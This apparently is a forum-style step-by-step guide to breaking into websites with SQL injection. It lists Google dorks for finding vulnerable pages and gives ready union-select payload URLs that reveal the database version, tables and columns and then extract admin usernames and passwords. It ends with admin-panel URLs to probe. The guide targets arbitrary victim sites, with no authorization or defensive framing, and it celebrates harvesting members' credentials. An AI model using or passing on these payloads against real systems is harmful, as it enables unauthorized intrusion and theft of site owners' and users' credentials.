# Hacking website using SQL Injection -step by step guide

Before we see what  SQL Injection is. We should know what SQL and Database are.
Database:
Database is collection of data. In website point of view, database is used for storing user ids,passwords,web page details and more.


Some List of Database are:

* DB servers,
* MySQL(Open source),
* MSSQL,
* MS-ACCESS,
* Oracle,
* Postgre SQL(open source),
* SQLite,

## SQL:
Structured Query Language is Known as SQL. In order to communicate with the Database ,we are using SQL query. We are querying the database so it is called as Query language.

Definition from Complete reference:

SQL is a tool for organizing, managing, and retrieving data stored by a computer
database. The name “SQL” is an abbreviation for Structured Query Language. For
historical reasons, SQL is usually pronounced “sequel,” but the alternate pronunciation
“S.Q.L.” is also used. As the name implies, SQL is a computer language that you use to
interact with a database. In fact, SQL works with one specific type of database, called a
relational database.

### Simple Basic Queries for SQL:

Select * from table_name :
this statement is used for showing the content of tables including column name.
For eg:
```
select * from users;
```

Insert into table_name(column_names,…) values(corresponding values for columns):
For inserting data to table.
For eg:
```
insert into users(username,userid) values(“BreakTheSec”,”break”);
```

I will give more detail and query in my next thread about the SQL QUERY.

### What is SQL Injection?
SQL injection is Common and famous method of hacking at present . Using this method an unauthorized person can access the database of the website. Attacker can get all details from the Database.

What an attacker can do?

* ByPassing Logins
* Accessing secret data
* Modifying contents of website
* Shutting down the My SQL server

Now let’s dive into the real procedure for the SQL Injection.
Follow my steps.

#### Step 1: Finding Vulnerable Website:
Our best partner for SQL injection is Google. We can find the Vulnerable websites(hackable websites) using Google Dork list. google dork is searching for vulnerable websites using the google searching tricks. There is lot of tricks to search in google. But we are going to use “inurl:” command for finding the vulnerable websites.

Some Examples:
```
inurl:index.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:pageid=
```
Here is the huge list of Google Dork
http://www.ziddu.com/download/13161874/A…t.zip.html

How to use?
copy one of the above command and paste in the google search engine box.
Hit enter.
You can get list of web sites.
We have to visit the websites one by one for checking the vulnerability.
So Start from the first website.


Note:if you like to hack particular website,then try this:
```
site:www.victimsite.com dork_list_commands
```
for eg:
```
site:www.victimsite.com inurl:index.php?id=
```

#### Step 2: Checking the Vulnerability:
Now we should check the vulnerability of websites. In order to check the vulnerability ,add the single quotes(‘) at the end of the url and hit enter. (No space between the number and single quotes)

For eg:
```
http://www.victimsite.com/index.php?id=2'
```

If the page remains in same page or showing that page not found or showing some other webpages. Then it is not vulnerable.

If it showing any errors which is related to sql query,then it is vulnerable. Cheers..!!
For eg:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1
```

#### Step 3: Finding Number of columns:
Now we have found the website is vulnerable. Next step is to find the number of columns in the table.
For that replace the single quotes(‘) with “order by n” statement.(leave one space between number and order by n statement)

Change the n from 1,2,3,4,,5,6,…n. Until you get the error like “unknown column “.

For eg:
```
http://www.victimsite.com/index.php?id=2 order by 1
http://www.victimsite.com/index.php?id=2 order by 2
http://www.victimsite.com/index.php?id=2 order by 3
http://www.victimsite.com/index.php?id=2 order by 4
```
change the number until you get the error as “unknown column”

if you get the error while trying the “x”th number,then no of column is “x-1”.

I mean:
```
http://www.victimsite.com/index.php?id=2 order by 1(noerror)
http://www.victimsite.com/index.php?id=2 order by 2(noerror)
http://www.victimsite.com/index.php?id=2 order by 3(noerror)
http://www.victimsite.com/index.php?id=2 order by 4(noerror)
http://www.victimsite.com/index.php?id=2 order by 5(noerror)
http://www.victimsite.com/index.php?id=2 order by 6(noerror)
http://www.victimsite.com/index.php?id=2 order by 7(noerror)
http://www.victimsite.com/index.php?id=2 order by 8(error)
```

so now x=8 , The number of column is x-1 i.e, 7.

Sometime the above may not work. At the time add the “–” at the end of the statement.
For eg:
```
http://www.victimsite.com/index.php?id=2 order by 1--
```

#### Step 4: Displaying the Vulnerable columns:
Using “union select columns_sequence” we can find the vulnerable part of the table. Replace the “order by n” with this statement. And change the id value to negative(i mean id=-2,must change,but in some website may work without changing).

Replace the columns_sequence with the no from 1 to x-1(number of columns) separated with commas(,).

For eg:
if the number of columns is 7 ,then the query is as follow:
```
http://www.victimsite.com/index.php?id=-2 union select 1,2,3,4,5,6,7--
```
If the above method is not working then try this:
```
http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,3,4,5,6,7--
```
It will show some numbers in the page(it must be less than ‘x’ value, i mean less than or equl to number of columns).

Like this:


Now select 1 number.
It showing 3,7. Let’s take the Number 3.

#### Step 5: Finding version,database,user
Now replace the 3 from the query with “version()”

For eg:
```
http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,version(),4,5,6,7--
```
It will show the version as 5.0.1 or 4.3. something like this.

Replace the version() with database() and user() for finding the database,user respectively.

For eg:
```
http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,database(),4,5,6,7--

http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,user(),4,5,6,7--
```
If the above is not working,then try this:
```
http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,unhex(hex(@@version)),4,5,6,7--
```

#### Step 6: Finding the Table Name
if the version is 5 or above. Then follow these steps.  Now we have to find the table name of the database. Replace the 3 with “group_concat(table_name) and add the “from information_schema.tables where table_schema=database()”

For eg:
```
http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database()--
```
 Now it will show the list of table names. Find the table name which is related with the admin or user.


Now select the “admin ” table.

if the version is 4 or some others, you have to guess the table names. (user, tbluser).  It is hard and bore to do sql inection with version 4.

#### Step 7: Finding the Column Name

Now replace the “group_concat(table_name) with the “group_concat(column_name)”

Replace the “from information_schema.tables where table_schema=database()–” with “FROM information_schema.columns WHERE table_name=mysqlchar–

Now listen carefully ,we have to find convert the table name to MySql CHAR() string and replace mysqlchar with that .

Find MysqlChar() for Tablename:
First of all install the HackBar addon:
https://addons.mozilla.org/en-US/firefox/addon/3899/

Now
```
select sql->Mysql->MysqlChar()
```
This will open the small window ,enter the table name which you found. i am going to use the admin table name.

click ok

Now you can see the CHAR(numbers separated with commans) in the Hack toolbar.


Copy and paste the code at the end of the url instead of the “mysqlchar”
For eg:
```
http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)–
```

Now it will show the list of columns.
```
like admin,password,admin_id,admin_name,admin_password,active,id,admin_name,admin_pas ​ s,admin_id,admin_name,admin_password,ID_admin,admin_username,username,password..etc..
```
Now replace the replace group_concat(column_name) with group_concat(columnname,0x3a,anothercolumnname).

Columnname should be replaced from the listed column name.
anothercolumnname should be replace from the listed column name.

Now replace the ” from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)” with the “from table_name”

For eg:
```
http://www.victimsite.com/index.php?id=-2
and 1=2 union select 1,2,group_concat(admin_id,0x3a,admin_password),4,5,6,7 from admin--
```
Sometime it will show the column is not found.
Then try another column names

Now it will Username and passwords.

Enjoy..!!cheers..!!

If the website has members then jock-bot for you. You will have the list of usernames and password.
Some time you may have the email ids also,enjoy you got the Dock which can produce the golden eggs.

Step 8: Finding the Admin Panel:
Just try with url like:
```
http://www.victimsite.com/admin.php
http://www.victimsite.com/admin/
http://www.victimsite.com/admin.html
http://www.victimsite.com:2082/
```
etc.
If you have luck ,you will find the admin page using above urls. or try this list .
Here is the list of admin urls:
```
http://www.ziddu.com/download/13163866/A…t.zip.html
```